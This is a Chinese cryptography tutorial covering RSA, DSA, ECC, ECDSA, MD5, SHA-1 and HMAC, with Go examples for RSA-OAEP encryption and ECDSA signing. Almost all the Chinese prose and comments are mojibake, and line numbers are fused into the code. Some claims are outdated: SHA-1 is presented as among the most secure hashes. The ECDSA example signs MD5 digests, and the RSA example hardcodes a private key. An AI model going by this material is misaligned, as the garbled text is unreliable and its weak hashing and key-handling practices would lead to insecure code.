Áî±RSAÂÖ¨Âè∏ÂèëÊòéÔºåÊòØ‰∏Ä‰∏™ÊîØÊåÅÂèòÈïøÂØÜÈí•ÁöÑÂÖ¨ÂÖ±ÂØÜÈí•ÁÆóÊ≥ïÔºåÈúÄË¶ÅÂä†ÂØÜÁöÑÊñá‰ª∂ÂùóÁöÑÈïøÂ∫¶‰πüÊòØÂèØÂèòÁöÑÔºõ DSA(Digital Signature Algorithm): Êï∞Â≠óÁ≠æÂêçÁÆóÊ≥ïÔºåÊòØ‰∏ÄÁßçÊ†áÂáÜÁöÑDSS(Êï∞Â≠óÁ≠æÂêçÊ†áÂáÜ)Ôºõ ECC(Elliptic Curves Cryptography): Ê§≠ÂúÜÊõ≤Á∫øÂØÜÁ†ÅÁºñÁ†ÅÂ≠¶„ÄÇ ECDSA(Elliptic Curve Digital Signature Algorithm): Âü∫‰∫éÊ§≠ÂúÜÊõ≤Á∫øÁöÑDSAÁ≠æÂêçÁÆóÊ≥ï DSADSAÊòØÂü∫‰∫éÊï¥Êï∞ÊúâÈôêÂüüÁ¶ªÊï£ÂØπÊï∞ÈöæÈ¢òÁöÑÔºåÂÖ∂ÂÆâÂÖ®ÊÄß‰∏éRSAÁõ∏ÊØîÂ∑Æ‰∏çÂ§ö„ÄÇDSAÁöÑ‰∏Ä‰∏™ÈáçË¶ÅÁâπÁÇπÊòØ‰∏§‰∏™Á¥†Êï∞ÂÖ¨ÂºÄÔºåËøôÊ†∑ÔºåÂΩì‰ΩøÁî®Âà´‰∫∫ÁöÑpÂíåqÊó∂ÔºåÂç≥‰Ωø‰∏çÁü•ÈÅìÁßÅÈí•Ôºå‰Ω†‰πüËÉΩÁ°ÆËÆ§ÂÆÉ‰ª¨ÊòØÂê¶ÊòØÈöèÊú∫‰∫ßÁîüÁöÑÔºåËøòÊòØ‰Ωú‰∫ÜÊâãËÑö„ÄÇRSAÁÆóÊ≥ïÂç¥ÂÅö‰∏çÂà∞‰ΩÜÊòØÂÖ∂Áº∫ÁÇπÂ∞±ÊòØÂè™ËÉΩÁî®‰∫éÊï∞Â≠óÁ≠æÂêç, ‰∏çËÉΩÁî®‰∫éÂä†ÂØÜ„ÄÇ RSAÂú®1976Âπ¥ÔºåÁî±‰∫éÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÂ∑≤Áªè‰∏çËÉΩÊª°Ë∂≥ÈúÄË¶ÅÔºåDiffie ÂíåHellmanÂèëË°®‰∫Ü‰∏ÄÁØáÂè´„ÄäÂØÜÁ†ÅÂ≠¶Êñ∞Âä®Âêë„ÄãÁöÑÊñáÁ´†Ôºå‰ªãÁªç‰∫ÜÂÖ¨ÂåôÂä†ÂØÜÁöÑÊ¶ÇÂøµÔºåÁî±Rivet„ÄÅShamir„ÄÅAdelmanÊèêÂá∫‰∫ÜRSAÁÆóÊ≥ï„ÄÇRSAÊòØÁõÆÂâçÊúÄÊúâÂΩ±ÂìçÂäõÁöÑÂÖ¨Èí•Âä†ÂØÜÁÆóÊ≥ïÔºåÂÆÉËÉΩÂ§üÊäµÊäóÂà∞ÁõÆÂâç‰∏∫Ê≠¢Â∑≤Áü•ÁöÑÁªùÂ§ßÂ§öÊï∞ÂØÜÁ†ÅÊîªÂáªÔºåÂ∑≤Ë¢´ISOÊé®Ëçê‰∏∫ÂÖ¨Èí•Êï∞ÊçÆÂä†ÂØÜÊ†áÂáÜ„ÄÇ ECCECCÂä†ÂØÜÁöÑÂéüÁêÜ‰æùËµñÊ§≠ÂúÜÊõ≤Á∫ø‰∏äÁöÑÈöæÈ¢ò„ÄÇ‰ªäÂ§©Âè™ÊúâÁü≠ÁöÑRSAÈí•ÂåôÊâçÂèØËÉΩË¢´Âº∫ÂäõÊñπÂºèËß£Á†¥„ÄÇÂà∞2008Âπ¥‰∏∫Ê≠¢Ôºå‰∏ñÁïå‰∏äËøòÊ≤°Êúâ‰ªª‰ΩïÂèØÈù†ÁöÑÊîªÂáªRSAÁÆóÊ≥ïÁöÑÊñπÂºè„ÄÇÂè™Ë¶ÅÂÖ∂Èí•ÂåôÁöÑÈïøÂ∫¶Ë∂≥Â§üÈïøÔºåÁî®RSAÂä†ÂØÜÁöÑ‰ø°ÊÅØÂÆûÈôÖ‰∏äÊòØ‰∏çËÉΩË¢´Ëß£Á†¥ÁöÑ„ÄÇ‰ΩÜÂú®ÂàÜÂ∏ÉÂºèËÆ°ÁÆóÂíåÈáèÂ≠êËÆ°ÁÆóÊú∫ÁêÜËÆ∫Êó•Ë∂ãÊàêÁÜüÁöÑ‰ªäÂ§©ÔºåRSAÂä†ÂØÜÂÆâÂÖ®ÊÄßÂèóÂà∞‰∫ÜÊåëÊàò„ÄÇÈöèÁùÄÂàÜËß£Â§ßÊï¥Êï∞ÊñπÊ≥ïÁöÑËøõÊ≠•ÂèäÂÆåÂñÑ„ÄÅËÆ°ÁÆóÊú∫ÈÄüÂ∫¶ÁöÑÊèêÈ´ò‰ª•ÂèäËÆ°ÁÆóÊú∫ÁΩëÁªúÁöÑÂèëÂ±ïÔºå‰∏∫‰∫Ü‰øùÈöúÊï∞ÊçÆÁöÑÂÆâÂÖ®ÔºåRSAÁöÑÂØÜÈí•ÈúÄË¶Å‰∏çÊñ≠Â¢ûÂä†Ôºå‰ΩÜÊòØÔºåÂØÜÈí•ÈïøÂ∫¶ÁöÑÂ¢ûÂä†ÂØºËá¥‰∫ÜÂÖ∂Âä†Ëß£ÂØÜÁöÑÈÄüÂ∫¶Â§ß‰∏∫Èôç‰ΩéÔºåÁ°¨‰ª∂ÂÆûÁé∞‰πüÂèòÂæóË∂äÊù•Ë∂äÈöæ‰ª•ÂøçÂèóÔºåËøôÂØπ‰ΩøÁî®RSAÁöÑÂ∫îÁî®Â∏¶Êù•‰∫ÜÂæàÈáçÁöÑË¥üÊãÖÔºåÂõ†Ê≠§ÈúÄË¶Å‰∏ÄÁßçÊñ∞ÁöÑÁÆóÊ≥ïÊù•‰ª£ÊõøRSA„ÄÇ1985Âπ¥N.KoblitzÂíåMillerÊèêÂá∫Â∞ÜÊ§≠ÂúÜÊõ≤Á∫øÁî®‰∫éÂØÜÁ†ÅÁÆóÊ≥ïÔºåÊ†πÊçÆÊòØÊúâÈôêÂüü‰∏äÁöÑÊ§≠ÂúÜÊõ≤Á∫ø‰∏äÁöÑÁÇπÁæ§‰∏≠ÁöÑÁ¶ªÊï£ÂØπÊï∞ÈóÆÈ¢òECDLP„ÄÇECDLPÊòØÊØîÂõ†Â≠êÂàÜËß£ÈóÆÈ¢òÊõ¥ÈöæÁöÑÈóÆÈ¢òÔºåÂÆÉÊòØÊåáÊï∞Á∫ßÁöÑÈöæÂ∫¶„ÄÇ ECDSAÂõ†‰∏∫Âú®Êï∞Â≠óÁ≠æÂêçÁöÑÂÆâÂÖ®ÊÄßÈ´ò, Âü∫‰∫éECCÁöÑDSAÊõ¥È´ò, ÊâÄ‰ª•ÈùûÂ∏∏ÈÄÇÂêàÊï∞Â≠óÁ≠æÂêç‰ΩøÁî®Âú∫ÊôØ, Âú®SSH TLSÊúâÂπøÊ≥õ‰ΩøÁî®, ECCÊääÁ¶ªÊï£ÂØπÊï∞ÂÆâÂÖ®ÊÄßÈ´òÂæàÂ∞ë, ÊâÄ‰ª•ECCÂú®ÂÆâÂÖ®È¢ÜÂüü‰ºöÊàê‰∏∫‰∏ã‰∏Ä‰∏™Ê†áÂáÜ„ÄÇ ECC‰∏éRSAÁöÑÊØîËæÉECCÂíåRSAÁõ∏ÊØîÔºåÂú®ËÆ∏Â§öÊñπÈù¢ÈÉΩÊúâÂØπÁªùÂØπÁöÑ‰ºòÂäøÔºå‰∏ªË¶Å‰ΩìÁé∞Âú®‰ª•‰∏ãÊñπÈù¢Ôºö ÊäóÊîªÂáªÊÄßÂº∫„ÄÇÁõ∏ÂêåÁöÑÂØÜÈí•ÈïøÂ∫¶ÔºåÂÖ∂ÊäóÊîªÂáªÊÄßË¶ÅÂº∫ÂæàÂ§öÂÄç„ÄÇ ËÆ°ÁÆóÈáèÂ∞èÔºåÂ§ÑÁêÜÈÄüÂ∫¶Âø´„ÄÇECCÊÄªÁöÑÈÄüÂ∫¶ÊØîRSA„ÄÅDSAË¶ÅÂø´ÂæóÂ§ö„ÄÇ Â≠òÂÇ®Á©∫Èó¥Âç†Áî®Â∞è„ÄÇECCÁöÑÂØÜÈí•Â∞∫ÂØ∏ÂíåÁ≥ªÁªüÂèÇÊï∞‰∏éRSA„ÄÅDSAÁõ∏ÊØîË¶ÅÂ∞èÂæóÂ§öÔºåÊÑèÂë≥ÁùÄÂÆÉÊâÄÂç†ÁöÑÂ≠òË¥ÆÁ©∫Èó¥Ë¶ÅÂ∞èÂæóÂ§ö„ÄÇËøôÂØπ‰∫éÂä†ÂØÜÁÆóÊ≥ïÂú®ICÂç°‰∏äÁöÑÂ∫îÁî®ÂÖ∑ÊúâÁâπÂà´ÈáçË¶ÅÁöÑÊÑè‰πâ„ÄÇ Â∏¶ÂÆΩË¶ÅÊ±Ç‰Ωé„ÄÇÂΩìÂØπÈïøÊ∂àÊÅØËøõË°åÂä†Ëß£ÂØÜÊó∂Ôºå‰∏âÁ±ªÂØÜÁ†ÅÁ≥ªÁªüÊúâÁõ∏ÂêåÁöÑÂ∏¶ÂÆΩË¶ÅÊ±ÇÔºå‰ΩÜÂ∫îÁî®‰∫éÁü≠Ê∂àÊÅØÊó∂ECCÂ∏¶ÂÆΩË¶ÅÊ±ÇÂç¥‰ΩéÂæóÂ§ö„ÄÇÂ∏¶ÂÆΩË¶ÅÊ±Ç‰Ωé‰ΩøECCÂú®Êó†Á∫øÁΩëÁªúÈ¢ÜÂüüÂÖ∑ÊúâÂπøÊ≥õÁöÑÂ∫îÁî®ÂâçÊôØ„ÄÇ ECCÁöÑËøô‰∫õÁâπÁÇπ‰ΩøÂÆÉÂøÖÂ∞ÜÂèñ‰ª£RSAÔºåÊàê‰∏∫ÈÄöÁî®ÁöÑÂÖ¨Èí•Âä†ÂØÜÁÆóÊ≥ï„ÄÇÊØîÂ¶ÇSETÂçèËÆÆÁöÑÂà∂ÂÆöËÄÖÂ∑≤ÊääÂÆÉ‰Ωú‰∏∫‰∏ã‰∏Ä‰ª£SETÂçèËÆÆ‰∏≠Áº∫ÁúÅÁöÑÂÖ¨Èí•ÂØÜÁ†ÅÁÆóÊ≥ï„ÄÇECCÁöÑËøô‰∫õÁâπÁÇπ‰ΩøÂÆÉÂøÖÂ∞ÜÂèñ‰ª£RSAÔºåÊàê‰∏∫ÈÄöÁî®ÁöÑÂÖ¨Èí•Âä†ÂØÜÁÆóÊ≥ï„ÄÇÊØîÂ¶ÇSETÂçèËÆÆÁöÑÂà∂ÂÆöËÄÖÂ∑≤ÊääÂÆÉ‰Ωú‰∏∫‰∏ã‰∏Ä‰ª£SETÂçèËÆÆ‰∏≠Áº∫ÁúÅÁöÑÂÖ¨Èí•ÂØÜÁ†ÅÁÆóÊ≥ï„ÄÇ ‰ª£Á†ÅÁ§∫‰æãECCÊòØÊú™Êù•ÁöÑ‰∏Ä‰∏™Ë∂ãÂäø, Âú®IOTË°å‰∏öÊòØ‰∏Ä‰∏™‰∏çÈîôÁöÑÈÄâÊã©, ‰ΩÜÊòØÁé∞Âú®Ë¢´ÂπøÊ≥õ‰ΩøÁî®ÁöÑ‰æùÁÑ∂ÊòØRSA‰ª•‰∏ã‰ΩøÁî®RSAËøõË°åÂä†Ëß£ÂØÜ: ‰ΩøÁî®ÂØπÊñπÁöÑÂÖ¨Èí•Âä†ÂØÜÊï∞ÊçÆ, ÁÑ∂ÂêéÂèëÁªôÂØπÊñπ, ÂØπÊñπ‰ΩøÁî®Ëá™Â∑±ÁöÑÁßÅÈí•Ëß£ÂØÜ.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495package mainimport ( "crypto/rand" "crypto/rsa" "crypto/sha1" "crypto/x509" "encoding/pem" "fmt")// ‰ΩøÁî®ÂØπÊñπÁöÑÂÖ¨Èí•ÁöÑÊï∞ÊçÆ, Âè™ÊúâÂØπÊñπÁöÑÁßÅÈí•ÊâçËÉΩËß£ÂºÄfunc encrypt(plain string, publicKey string) (cipherByte []byte, err error) &#123; msg := []byte(plain) // Ëß£Á†ÅÂÖ¨Èí• pubBlock, _ := pem.Decode([]byte(publicKey)) // ËØªÂèñÂÖ¨Èí• pubKeyValue, err := x509.ParsePKIXPublicKey(pubBlock.Bytes) if err != nil &#123; panic(err) &#125; pub := pubKeyValue.(*rsa.PublicKey) // Âä†ÂØÜÊï∞ÊçÆÊñπÊ≥ï: ‰∏çÁî®‰ΩøÁî®EncryptPKCS1v15ÊñπÊ≥ïÂä†ÂØÜ,Ê∫êÁ†ÅÈáåÈù¢Êé®Ëçê‰ΩøÁî®EncryptOAEP, Âõ†Ê≠§ËøôÈáå‰ΩøÁî®ÂÆâÂÖ®ÁöÑÊñπÊ≥ïÂä†ÂØÜ encryptOAEP, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, pub, msg, nil) if err != nil &#123; panic(err) &#125; cipherByte = encryptOAEP return&#125;// ‰ΩøÁî®ÁßÅÈí•Ëß£ÂØÜÂÖ¨Èí•Âä†ÂØÜÁöÑÊï∞ÊçÆfunc decrypt(cipherByte []byte, privateKey string) (plainText string, err error) &#123; // Ëß£ÊûêÂá∫ÁßÅÈí• priBlock, _ := pem.Decode([]byte(privateKey)) priKey, err := x509.ParsePKCS1PrivateKey(priBlock.Bytes) if err != nil &#123; panic(err) &#125; // Ëß£ÂØÜRSA-OAEPÊñπÂºèÂä†ÂØÜÂêéÁöÑÂÜÖÂÆπ decryptOAEP, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priKey, cipherByte, nil) if err != nil &#123; panic(err) &#125; plainText = string(decryptOAEP) return&#125;func test() &#123; msg := "Content bo be encrypted!" // Ëé∑ÂèñÂÖ¨Èí•, Áîü‰∫ßÁéØÂ¢ÉÂæÄÂæÄÊòØÊñá‰ª∂‰∏≠ËØªÂèñ, ËøôÈáå‰∏∫‰∫ÜÊµãËØïÊñπ‰æø, Áõ¥Êé•ÁîüÊàê‰∫Ü. publicKeyData := `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQAB-----END PUBLIC KEY-----` // Ëé∑ÂèñÁßÅÈí• privateKeyData := `-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQDZsfv1qscqYdy4vY+P4e3cAtmvppXQcRvrF1cB4drkv0haU24Y7m5qYtT52Kr539RdbKKdLAM6s20lWy7+5C0DgacdwYWd/7PeCELyEipZJL07Vro7Ate8Bfjya+wltGK9+XNUIHiumUKULW4KDx21+1NLAUeJ6PeW+DAkmJWF6QIDAQABAoGBAJlNxenTQj6OfCl9FMR2jlMJjtMrtQT9InQEE7m3m7bLHeC+MCJOhmNVBjaMZpthDORdxIZ6oCuOf6Z2+Dl35lntGFh5J7S34UP2BWzF1IyyQfySCNexGNHKT1G1XKQtHmtc2gWWthEg+S6ciIyw2IGrrP2Rke81vYHExPrexf0hAkEA9Izb0MiYsMCB/jemLJB0Lb3Y/B8xjGjQFFBQT7bmwBVjvZWZVpnMnXi9sWGdgUpxsCuAIROXjZ40IRZ2C9EouwJBAOPjPvV8Sgw4vaseOqlJvSq/C/pIFx6RVznDGlc8bRg7SgTPpjHG4G+M3mVgpCX1a/EU1mB+fhiJ2LAZ/pTtY6sCQGaW9NwIWu3DRIVGCSMm0mYh/3X9DAcwLSJoctiODQ1Fq9rreDE5QfpJnaJdJfsIJNtX1F+L3YceeBXtW0Ynz2MCQBI89KP274Is5FkWkUFNKnuKUK4WKOuEXEO+LpR+vIhs7k6WQ8nGDd4/mujoJBr5mkrwDPwqA3N5TMNDQVGv8gMCQQCaKGJgWYgvo3/milFfImbp+m7/Y3vCptarldXrYQWOAQjxwc71ZGBFDITYvdgJM1MTqc8xQek1FXn1vfpy2c6O-----END RSA PRIVATE KEY-----` cipherData, err := encrypt(msg, publicKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("encrypt message: %x\n", cipherData) plainData, err := decrypt(cipherData, privateKeyData) if err != nil &#123; panic(err) &#125; fmt.Printf("decrypt message:%s\n", plainData)&#125;func main() &#123; test()&#125; ecdsaÊ≠£Âú®ÈÄêÊ∏êÊàê‰∏∫Êï∞Â≠óÁ≠æÂêçÁöÑ‰∏Ä‰∏™Ê†áÂáÜ, Âú®golangÁöÑsshÂ∫ì‰∏≠Â∞±ÊòØ‰ΩøÁî®Ëøô‰∏™ÁÆóÊ≥ïÊù•Á≠æÂêçÁöÑ: A‰ΩøÁî®Ëá™Â∑±ÁöÑÁßÅÈí•Á≠æÂêç‰∏ÄÊÆµÊï∞ÊçÆ, ÁÑ∂ÂêéÂ∞ÜÂÖ¨Èí•ÂèëÊîæÂá∫Âéª. Áî®Êà∑ÊãøÂà∞ÂÖ¨Èí•Âêé, È™åËØÅÊï∞ÊçÆÁöÑÁ≠æÂêç,Â¶ÇÊûúÈÄöËøáÂàôËØÅÊòéÊï∞ÊçÆÊù•Ê∫êÊòØA, ‰ªéËÄåËææÂà∞Ë∫´‰ªΩËÆ§ËØÅÁöÑ‰ΩúÁî®.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package mainimport ( "crypto/ecdsa" "crypto/elliptic" "crypto/md5" "crypto/rand" "fmt" "hash" "io" "math/big")// SignData Áî®‰∫é‰øùÂ≠òÁ≠æÂêçÁöÑÊï∞ÊçÆtype SignData struct &#123; r *big.Int s *big.Int signhash *[]byte signature *[]byte&#125;// ‰ΩøÁî®ÁßÅÈí•Á≠æÂêç‰∏ÄÊÆµÊï∞ÊçÆfunc sign(message string, privateKey *ecdsa.PrivateKey) (signData *SignData, err error) &#123; // Á≠æÂêçÊï∞ÊçÆ var h hash.Hash h = md5.New() r := big.NewInt(0) s := big.NewInt(0) io.WriteString(h, message) signhash := h.Sum(nil) r, s, serr := ecdsa.Sign(rand.Reader, privateKey, signhash) if serr != nil &#123; return nil, serr &#125; signature := r.Bytes() signature = append(signature, s.Bytes()...) signData = &amp;SignData&#123; r: r, s: s, signhash: &amp;signhash, signature: &amp;signature, &#125; return&#125;// Ê†°È™åÊï∞Â≠óÁ≠æÂêçfunc verifySign(signData *SignData, publicKey *ecdsa.PublicKey) (status bool) &#123; status = ecdsa.Verify(publicKey, *signData.signhash, signData.r, signData.s) return&#125;func test() &#123; //‰ΩøÁî®Ê§≠ÂúÜÊõ≤Á∫øÁöÑP256ÁÆóÊ≥ï,Áé∞Âú®‰∏ÄÂÖ±‰πüÂ∞±ÂÆûÁé∞‰∫Ü4Áßç,Êàë‰ª¨‰ΩøÁî®Êäò‰∏≠‰∏ÄÁßç,ÂÖ∑‰ΩìËßÅhttp://golang.org/pkg/crypto/elliptic/#P256 pubkeyCurve := elliptic.P256() privateKey := new(ecdsa.PrivateKey) // ÁîüÊàêÁßòÈí•ÂØπ privateKey, err := ecdsa.GenerateKey(pubkeyCurve, rand.Reader) if err != nil &#123; panic(err) &#125; var publicKey ecdsa.PublicKey publicKey = privateKey.PublicKey // Á≠æÂêç signData, err := sign("This is a message to be signed and verified by ECDSA!", privateKey) if err != nil &#123; panic(err) &#125; fmt.Printf("The signhash: %x\nThe signature: %x\n", *signData.signhash, *signData.signature) // È™åËØÅ status := verifySign(signData, &amp;publicKey) fmt.Printf("The verify result is: %v\n", status)&#125;func main() &#123; test()&#125; Êï£ÂàóÁÆóÊ≥ïÊï£ÂàóÊòØ‰ø°ÊÅØÁöÑÊèêÁÇºÔºåÈÄöÂ∏∏ÂÖ∂ÈïøÂ∫¶Ë¶ÅÊØî‰ø°ÊÅØÂ∞èÂæóÂ§öÔºå‰∏î‰∏∫‰∏Ä‰∏™Âõ∫ÂÆöÈïøÂ∫¶„ÄÇÂä†ÂØÜÊÄßÂº∫ÁöÑÊï£Âàó‰∏ÄÂÆöÊòØ‰∏çÂèØÈÄÜÁöÑÔºåËøôÂ∞±ÊÑèÂë≥ÁùÄÈÄöËøáÊï£ÂàóÁªìÊûúÔºåÊó†Ê≥ïÊé®Âá∫‰ªª‰ΩïÈÉ®ÂàÜÁöÑÂéüÂßã‰ø°ÊÅØ„ÄÇ‰ªª‰ΩïËæìÂÖ•‰ø°ÊÅØÁöÑÂèòÂåñÔºåÂì™ÊÄï‰ªÖ‰∏Ä‰ΩçÔºåÈÉΩÂ∞ÜÂØºËá¥Êï£ÂàóÁªìÊûúÁöÑÊòéÊòæÂèòÂåñÔºåËøôÁß∞‰πã‰∏∫Èõ™Â¥©ÊïàÂ∫î„ÄÇÊï£ÂàóËøòÂ∫îËØ•ÊòØÈò≤ÂÜ≤Á™ÅÁöÑÔºåÂç≥Êâæ‰∏çÂá∫ÂÖ∑ÊúâÁõ∏ÂêåÊï£ÂàóÁªìÊûúÁöÑ‰∏§Êù°‰ø°ÊÅØ„ÄÇÂÖ∑ÊúâËøô‰∫õÁâπÊÄßÁöÑÊï£ÂàóÁªìÊûúÂ∞±ÂèØ‰ª•Áî®‰∫éÈ™åËØÅ‰ø°ÊÅØÊòØÂê¶Ë¢´‰øÆÊîπ„ÄÇÂ∏∏Áî®‰∫é‰øùËØÅÊï∞ÊçÆÂÆåÊï¥ÊÄßÂçïÂêëÊï£ÂàóÂáΩÊï∞‰∏ÄËà¨Áî®‰∫é‰∫ßÁîüÊ∂àÊÅØÊëòË¶ÅÔºåÂØÜÈí•Âä†ÂØÜÁ≠âÔºåÂ∏∏ËßÅÁöÑÊúâÔºö MD5(Message Digest Algorithm 5): ÊòØRSAÊï∞ÊçÆÂÆâÂÖ®ÂÖ¨Âè∏ÂºÄÂèëÁöÑ‰∏ÄÁßçÂçïÂêëÊï£ÂàóÁÆóÊ≥ï„ÄÇ SHA(Secure Hash Algorithm): ÂèØ‰ª•ÂØπ‰ªªÊÑèÈïøÂ∫¶ÁöÑÊï∞ÊçÆËøêÁÆóÁîüÊàê‰∏Ä‰∏™160‰ΩçÁöÑÊï∞ÂÄºÔºõ MD5MD5Âç≥Message-Digest Algorithm 5Ôºà‰ø°ÊÅØ-ÊëòË¶ÅÁÆóÊ≥ï5ÔºâÔºåÁî®‰∫éÁ°Æ‰øù‰ø°ÊÅØ‰º†ËæìÂÆåÊï¥‰∏ÄËá¥„ÄÇÊòØËÆ°ÁÆóÊú∫ÂπøÊ≥õ‰ΩøÁî®ÁöÑÊùÇÂáëÁÆóÊ≥ï‰πã‰∏ÄÔºàÂèàËØëÊëòË¶ÅÁÆóÊ≥ï„ÄÅÂìàÂ∏åÁÆóÊ≥ïÔºâÔºå‰∏ªÊµÅÁºñÁ®ãËØ≠Ë®ÄÊôÆÈÅçÂ∑≤ÊúâMD5ÂÆûÁé∞„ÄÇÂ∞ÜÊï∞ÊçÆÔºàÂ¶ÇÊ±âÂ≠óÔºâËøêÁÆó‰∏∫Âè¶‰∏ÄÂõ∫ÂÆöÈïøÂ∫¶ÂÄºÔºåÊòØÊùÇÂáëÁÆóÊ≥ïÁöÑÂü∫Á°ÄÂéüÁêÜÔºåMD5ÁöÑÂâçË∫´ÊúâMD2„ÄÅMD3ÂíåMD4 SHA-1Âú®1993Âπ¥ÔºåÂÆâÂÖ®Êï£ÂàóÁÆóÊ≥ïÔºàSHAÔºâÁî±ÁæéÂõΩÂõΩÂÆ∂Ê†áÂáÜÂíåÊäÄÊúØÂçè‰ºö(NIST)ÊèêÂá∫ÔºåÂπ∂‰Ωú‰∏∫ËÅîÈÇ¶‰ø°ÊÅØÂ§ÑÁêÜÊ†áÂáÜÔºàFIPS PUB 180ÔºâÂÖ¨Â∏ÉÔºõ1995Âπ¥ÂèàÂèëÂ∏É‰∫Ü‰∏Ä‰∏™‰øÆËÆ¢ÁâàFIPS PUB 180-1ÔºåÈÄöÂ∏∏Áß∞‰πã‰∏∫SHA-1„ÄÇSHA-1ÊòØÂü∫‰∫éMD4ÁÆóÊ≥ïÁöÑÔºåÂπ∂‰∏îÂÆÉÁöÑËÆæËÆ°Âú®ÂæàÂ§ßÁ®ãÂ∫¶‰∏äÊòØÊ®°‰ªøMD4ÁöÑ„ÄÇÁé∞Âú®Â∑≤Êàê‰∏∫ÂÖ¨ËÆ§ÁöÑÊúÄÂÆâÂÖ®ÁöÑÊï£ÂàóÁÆóÊ≥ï‰πã‰∏ÄÔºåÂπ∂Ë¢´ÂπøÊ≥õ‰ΩøÁî®„ÄÇSHA-1ÊòØ‰∏ÄÁßçÊï∞ÊçÆÂä†ÂØÜÁÆóÊ≥ïÔºåËØ•ÁÆóÊ≥ïÁöÑÊÄùÊÉ≥ÊòØÊé•Êî∂‰∏ÄÊÆµÊòéÊñáÔºåÁÑ∂Âêé‰ª•‰∏ÄÁßç‰∏çÂèØÈÄÜÁöÑÊñπÂºèÂ∞ÜÂÆÉËΩ¨Êç¢Êàê‰∏ÄÊÆµÔºàÈÄöÂ∏∏Êõ¥Â∞èÔºâÂØÜÊñáÔºå‰πüÂèØ‰ª•ÁÆÄÂçïÁöÑÁêÜËß£‰∏∫Âèñ‰∏Ä‰∏≤ËæìÂÖ•Á†ÅÔºàÁß∞‰∏∫È¢ÑÊò†Â∞ÑÊàñ‰ø°ÊÅØÔºâÔºåÂπ∂ÊääÂÆÉ‰ª¨ËΩ¨Âåñ‰∏∫ÈïøÂ∫¶ËæÉÁü≠„ÄÅ‰ΩçÊï∞Âõ∫ÂÆöÁöÑËæìÂá∫Â∫èÂàóÂç≥Êï£ÂàóÂÄºÔºà‰πüÁß∞‰∏∫‰ø°ÊÅØÊëòË¶ÅÊàñ‰ø°ÊÅØËÆ§ËØÅ‰ª£Á†ÅÔºâÁöÑËøáÁ®ã„ÄÇËØ•ÁÆóÊ≥ïËæìÂÖ•Êä•ÊñáÁöÑÊúÄÂ§ßÈïøÂ∫¶‰∏çË∂ÖËøá264‰ΩçÔºå‰∫ßÁîüÁöÑËæìÂá∫ÊòØ‰∏Ä‰∏™160‰ΩçÁöÑÊä•ÊñáÊëòË¶Å„ÄÇËæìÂÖ•ÊòØÊåâ512 ‰ΩçÁöÑÂàÜÁªÑËøõË°åÂ§ÑÁêÜÁöÑ„ÄÇSHA-1ÊòØ‰∏çÂèØÈÄÜÁöÑ„ÄÅÈò≤ÂÜ≤Á™ÅÔºåÂπ∂ÂÖ∑ÊúâËâØÂ•ΩÁöÑÈõ™Â¥©ÊïàÂ∫î„ÄÇsha1ÊòØSHAÂÆ∂ÊóèÁöÑ‰∫î‰∏™ÁÆóÊ≥ï‰πã‰∏Ä(ÂÖ∂ÂÆÉÂõõ‰∏™ÊòØSHA-224„ÄÅSHA-256„ÄÅSHA-384ÔºåÂíåSHA-512) HMacHmacÁÆóÊ≥ï‰πüÊòØ‰∏ÄÁßçÂìàÂ∏åÁÆóÊ≥ïÔºåÂÆÉÂèØ‰ª•Âà©Áî®MD5ÊàñSHA1Á≠âÂìàÂ∏åÁÆóÊ≥ï„ÄÇ‰∏çÂêåÁöÑÊòØÔºåHmacËøòÈúÄË¶Å‰∏Ä‰∏™ÂØÜÈí•, Âè™Ë¶ÅÂØÜÈí•ÂèëÁîü‰∫ÜÂèòÂåñÔºåÈÇ£‰πàÂêåÊ†∑ÁöÑËæìÂÖ•Êï∞ÊçÆ‰πü‰ºöÂæóÂà∞‰∏çÂêåÁöÑÁ≠æÂêçÔºåÂõ†Ê≠§ÔºåÂèØ‰ª•ÊääHmacÁêÜËß£‰∏∫Áî®ÈöèÊú∫Êï∞‚ÄúÂ¢ûÂº∫‚ÄùÁöÑÂìàÂ∏åÁÆóÊ≥ï„ÄÇ SHA-1‰∏éMD5ÁöÑÊØîËæÉÂõ†‰∏∫‰∫åËÄÖÂùáÁî±MD4ÂØºÂá∫ÔºåSHA-1ÂíåMD5ÂΩºÊ≠§ÂæàÁõ∏‰ºº„ÄÇÁõ∏Â∫îÁöÑÔºå‰ªñ‰ª¨ÁöÑÂº∫Â∫¶ÂíåÂÖ∂‰ªñÁâπÊÄß‰πüÊòØÁõ∏‰ººÔºå‰ΩÜËøòÊúâ‰ª•‰∏ãÂá†ÁÇπ‰∏çÂêåÔºö ÂØπÂº∫Ë°å‰æõÁªôÁöÑÂÆâÂÖ®ÊÄßÔºöÊúÄÊòæËëóÂíåÊúÄÈáçË¶ÅÁöÑÂå∫Âà´ÊòØSHA-1ÊëòË¶ÅÊØîMD5ÊëòË¶ÅÈïø32 ‰Ωç„ÄÇ‰ΩøÁî®Âº∫Ë°åÊäÄÊúØÔºå‰∫ßÁîü‰ªª‰Ωï‰∏Ä‰∏™Êä•Êñá‰ΩøÂÖ∂ÊëòË¶ÅÁ≠â‰∫éÁªôÂÆöÊä•ÊëòË¶ÅÁöÑÈöæÂ∫¶ÂØπMD5ÊòØ2128Êï∞ÈáèÁ∫ßÁöÑÊìç‰ΩúÔºåËÄåÂØπSHA-1ÂàôÊòØ2160Êï∞ÈáèÁ∫ßÁöÑÊìç‰Ωú„ÄÇËøôÊ†∑ÔºåSHA-1ÂØπÂº∫Ë°åÊîªÂáªÊúâÊõ¥Â§ßÁöÑÂº∫Â∫¶„ÄÇ 